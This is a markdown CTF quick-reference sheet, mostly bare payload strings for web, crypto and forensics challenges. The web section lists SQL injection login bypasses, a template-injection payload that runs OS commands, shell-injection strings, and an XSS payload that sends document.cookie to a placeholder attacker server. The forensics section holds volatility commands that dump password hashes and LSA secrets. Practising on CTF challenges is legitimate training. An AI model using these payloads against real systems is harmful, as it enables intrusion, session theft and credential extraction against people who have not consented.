# 07 — CTF Writeups: Payloads

> Quick-reference payloads commonly needed during CTF challenges.

## 🔴 Web CTF Payloads
```
# SQLi auth bypass
' OR 1=1-- -
admin'-- -
' UNION SELECT 1,2,3-- -

# XSS
<script>alert(document.cookie)</script>
<img src=x onerror=fetch('http://YOUR_SERVER/'+document.cookie)>

# SSTI
{{7*7}}
{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}

# Command injection
; cat flag.txt
$(cat flag.txt)
`cat flag.txt`

# PHP type juggling
"0e123" == "0e456" → TRUE (both equal 0 in loose comparison)
```

## 🔴 Crypto CTF Quick Reference
```python
# XOR (Python)
def xor(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# Base64
import base64
base64.b64decode('encoded_string')

# Hex
bytes.fromhex('hex_string')

# ROT13
import codecs
codecs.decode('grfg', 'rot_13')

# RSA (small e, small n)
from Crypto.Util.number import long_to_bytes, inverse
# If n is small → factorize at factordb.com
# phi = (p-1)(q-1), d = inverse(e, phi), m = pow(c, d, n)
```

## 🔴 Forensics Payloads
```bash
# Extract hidden files
binwalk -e file
foremost file
steghide extract -sf image.jpg -p ""   # Empty password

# Memory dump password extraction
volatility -f memory.dmp --profile=Win7SP1x64 hashdump
volatility -f memory.dmp --profile=Win7SP1x64 lsadump

# PCAP flag extraction
strings capture.pcap | grep -i flag
tshark -r capture.pcap -Y "http.response" -T fields -e http.file_data
```
